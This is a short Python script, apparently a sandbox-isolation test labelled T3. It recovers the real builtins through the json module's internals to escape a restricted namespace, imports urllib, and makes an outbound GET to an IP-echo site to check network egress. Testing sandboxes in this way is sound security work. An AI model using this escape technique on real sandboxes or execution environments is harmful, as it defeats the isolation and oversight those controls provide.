"""T3: escape via json builtins and HTTP GET https://ipchicken.com via urllib."""

import json

URL = "https://ipchicken.com"
BODY_PREFIX_LEN = 200


def run():
    real_builtins = json.__dict__["__builtins__"]
    if not isinstance(real_builtins, dict):
        real_builtins = real_builtins.__dict__

    # fromlist forces submodule return (plain __import__ of dotted name returns parent).
    urllib_request = real_builtins["__import__"](
        "urllib.request", globals(), locals(), ["Request", "urlopen"], 0
    )
    request = urllib_request.Request(
        URL,
        headers={"User-Agent": "rtc358-benign-sandbox-test/1.0"},
        method="GET",
    )
    try:
        with urllib_request.urlopen(request, timeout=15) as response:
            status = getattr(response, "status", None)
            if status is None:
                status = response.getcode()
            raw = response.read(BODY_PREFIX_LEN)
    except Exception as exc:  # surface host/network vs interpreter issues
        return {
            "ok": False,
            "test_id": "T3",
            "url": URL,
            "error_type": type(exc).__name__,
            "error": str(exc)[:300],
        }

    try:
        body_prefix = raw.decode("utf-8", errors="replace")
    except Exception:
        body_prefix = repr(raw[:BODY_PREFIX_LEN])

    return {
        "ok": status is not None,
        "test_id": "T3",
        "url": URL,
        "http_status": status,
        "body_prefix": body_prefix,
    }
